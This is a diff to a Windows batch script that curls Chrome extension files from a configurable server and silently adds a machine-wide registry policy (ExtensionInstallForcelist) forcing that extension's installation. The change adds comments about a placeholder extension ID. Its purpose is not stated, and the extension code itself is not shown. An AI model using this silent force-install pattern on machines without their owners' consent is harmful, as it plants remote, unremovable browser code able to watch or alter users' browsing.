@@ -19,7 +19,9 @@ curl -s -o "%EXT_DIR%\manifest.json" "%SERVER_URL%/extension/manifest.json"
 curl -s -o "%EXT_DIR%\background.js" "%SERVER_URL%/extension/background.js"
 
 echo [2/3] Installing Chrome policy...
-reg add "HKLM\SOFTWARE\Policies\Google\Chrome\ExtensionInstallForcelist" /v 1 /d "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa;%SERVER_URL%/update.xml" /t REG_SZ /f >nul 2>&1
+:: IMPORTANT: Replace "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" with your actual extension ID
+:: Get the real ID after packing the extension in Chrome (chrome://extensions -> Pack extension)
+reg add "HKLM\SOFTWARE\Policies\Google\Chrome\ExtensionInstallForcelist" /v 1 /d "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa;%SERVER_URL%/extension/update.xml" /t REG_SZ /f >nul 2>&1
 
 echo [3/3] Done!
 echo.
